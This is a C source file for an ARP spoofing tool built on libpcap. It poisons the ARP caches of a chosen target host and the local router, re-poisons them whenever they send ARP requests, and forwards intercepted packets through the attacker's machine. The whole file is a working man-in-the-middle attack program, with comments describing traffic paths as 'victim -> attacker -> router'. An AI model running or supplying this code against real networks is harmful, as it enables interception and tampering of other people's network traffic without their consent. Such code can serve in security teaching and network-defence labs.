#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <netinet/tcp.h>   
#include <netinet/ip.h>  

#include "arp_spoof.h"

#define ARP_PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int main(int argc, char *argv[])
{
	u_int8_t my_ip[IP_ADDR_SIZE];          // my ip
	u_int8_t my_mac[MAC_ADDR_SIZE];        // my mac
	u_int8_t router_ip[IP_ADDR_SIZE];      // router ip
	u_int8_t router_mac[MAC_ADDR_SIZE];    // router ip
	u_int8_t *ifname;                      // interface name
	u_int8_t *targetIP;                    // target ip
	u_int8_t targetMAC[MAC_ADDR_SIZE];     // target mac
	  
	u_int8_t my_ip_hex[4];        
	u_int8_t my_mac_hex[6];        
	u_int8_t router_ip_hex[4];     
	u_int8_t router_mac_hex[6]; 
	u_int8_t targetIP_hex[4];    
	u_int8_t targetMAC_hex[6];    

	pcap_t *handle;
	struct pcap_pkthdr* header_ptr;
	const u_char *pkt_data;
	u_char *temp_data;
	char errbuf[100]; 

	char packet[ARP_PACKET_LEN];  
	struct ether_header * eth = (struct ether_header *) packet;
	struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
	

	if (argc !=3 ) 
	{
	  puts("Usage: ./a.out <interface> <target ip address>");
	  return EXIT_FAILURE;
	}

	ifname    = argv[1];
	targetIP  = argv[2];

	printf("\nInput Value -------------------------------------\n");
	printf(" [*] - Interface \t: %s \n",ifname);
	printf(" [*] - Target IP \t: %s \n",targetIP);
	printf("-------------------------------------------------\n");     
  
    getLocalAddress(ifname, my_ip, my_mac, router_ip);
                                 
	printf("\nGet Local Information ---------------------------\n");
	printf(" [*] - IP ADDR    \t: %s \n",my_ip);
	printf(" [*] - MAC ADDR   \t: %s \n",my_mac);
	printf(" [*] - ROUTER ADDR\t: %s \n",router_ip);
	printf("------------------------------------------------\n");     

	arp_request(ifname, my_ip, my_mac, targetIP, targetMAC);   
	arp_request(ifname, my_ip, my_mac, router_ip, router_mac);                                   

	inet_pton(AF_INET, my_ip  , my_ip_hex);  
	inet_pton(AF_INET, router_ip , router_ip_hex);  
	inet_pton(AF_INET, targetIP  , targetIP_hex);  

    sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  
        (u_int8_t *)&my_mac_hex[0],
        (u_int8_t *)&my_mac_hex[1],
        (u_int8_t *)&my_mac_hex[2],
        (u_int8_t *)&my_mac_hex[3],
        (u_int8_t *)&my_mac_hex[4],
        (u_int8_t *)&my_mac_hex[5]); 
 

	sscanf(targetMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  
	    (u_int8_t *)&targetMAC_hex[0],
	    (u_int8_t *)&targetMAC_hex[1],
	    (u_int8_t *)&targetMAC_hex[2],
	    (u_int8_t *)&targetMAC_hex[3],
	    (u_int8_t *)&targetMAC_hex[4],
	    (u_int8_t *)&targetMAC_hex[5]);

    sscanf(router_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  
      (u_int8_t *)&router_mac_hex[0],
      (u_int8_t *)&router_mac_hex[1],
      (u_int8_t *)&router_mac_hex[2],
      (u_int8_t *)&router_mac_hex[3],
      (u_int8_t *)&router_mac_hex[4],
      (u_int8_t *)&router_mac_hex[5]);

	arp_spoof(ifname, my_ip, my_mac, router_ip, targetIP, targetMAC);
	arp_spoof(ifname, my_ip, my_mac, targetIP, router_ip, router_mac);  
	  
	    /*
        printf("Router: %s :",router_mac);
        printf(" |router Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",
        router_mac_hex[0] , router_mac_hex[1] ,
        router_mac_hex[2] , router_mac_hex[3] ,
        router_mac_hex[4] , router_mac_hex[5] );*/


	handle = pcap_open_live(ifname, 65536, 0, 1, errbuf);

	if (handle == NULL) 
	{
	  fprintf(stderr, "Cannot open device %s: %s\n", ifname, errbuf);
	  return EXIT_FAILURE;
	}

	while(1)
	{
	    if(pcap_next_ex(handle, &header_ptr, &pkt_data)!=1)
	    {
	      printf("\n pcap_next_ex err %s\n", pcap_geterr(handle));    
	      continue;
	    }

	    //printf(" ethernet packet :");

	    eth = (struct ether_header*)pkt_data;
	    //temp_data = &pkt_data;

	    if (ntohs(eth->ether_type) == ETHERTYPE_ARP)
	    {	    	
	      	arp = (struct ether_arp*)(pkt_data + sizeof(struct ether_header));
	      
		    if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST)
		    {

	      		//printf(" arp_request \n");
	        	if(memcmp(arp->arp_tpa, router_ip_hex,sizeof(router_ip_hex)) == 0)
	        	{          
		          sleep(1);         
		          arp_spoof(ifname, my_ip, my_mac, router_ip, targetIP, targetMAC);
		 		  arp_spoof(ifname, my_ip, my_mac, targetIP, router_ip, router_mac);  
		    
		        }
		        else if(memcmp(arp->arp_tpa, targetIP_hex,sizeof(targetIP_hex)) == 0)
		        {          
		          sleep(1);
		          arp_spoof(ifname, my_ip, my_mac, router_ip, targetIP, targetMAC);
				  arp_spoof(ifname, my_ip, my_mac, targetIP, router_ip, router_mac);  
		  
		        }
	        	else
	          		continue;
	        }else
	      	  	continue;
	    }
	    else //if (ntohs(eth->ether_type) == ETHERTYPE_IP)
	    {

	    	//printf(" [*] other packer : ");

	    	struct sockaddr_in source,dest;
	        char sip[INET_ADDRSTRLEN],dip[INET_ADDRSTRLEN]; //INET_ADDRSTRLEN == 16 bytes
		    struct iphdr *iph = (struct iphdr *)(pkt_data  + sizeof(struct ethhdr) );
		            
		    memset(&source, 0, sizeof(source));
		    source.sin_addr.s_addr = iph->saddr;
		       
		    memset(&dest, 0, sizeof(dest));
		    dest.sin_addr.s_addr = iph->daddr;

		    inet_ntop(AF_INET, &source.sin_addr, sip,sizeof(sip));
		    inet_ntop(AF_INET, &dest.sin_addr,   dip,sizeof(dip));    
		    
		    if( strcmp(dip,targetIP) == 0 && memcmp(eth->ether_shost, router_ip_hex,sizeof(router_ip_hex)))
		    {        
		     // printf(" router -> attacker-> victim tcp packet :");
		      memcpy(eth->ether_shost, my_mac_hex,sizeof(my_mac_hex));
		      memcpy(eth->ether_dhost, targetMAC_hex,sizeof(targetMAC_hex));      
		    }
		    else if( strcmp(sip,targetIP) == 0 && memcmp(eth->ether_shost, targetIP_hex,sizeof(targetIP_hex)))
		    {         
		      //printf(" victim -> attacker -> router tcp packet :");
		      memcpy(eth->ether_dhost, router_mac_hex,sizeof(router_mac_hex));
		      memcpy(eth->ether_shost, my_mac_hex,sizeof(my_mac_hex));        
		    }
		    else
		      continue;    
		    
		    if(pcap_sendpacket(handle, (const u_char *)pkt_data, header_ptr->len ) == -1) 
		    {
		      fprintf(stderr, "\n-- pcap_sendpacket err %s ,len : %d\n", pcap_geterr(handle),header_ptr->len);
		      return EXIT_FAILURE;     
		    } 
		    else
		    {
		    	printf("[DEBUG] Print Header Length : %d \n", header_ptr->len);
		    	continue;	
		    }		        	      
		}
	}

	pcap_close(handle);
  	return EXIT_SUCCESS;
}
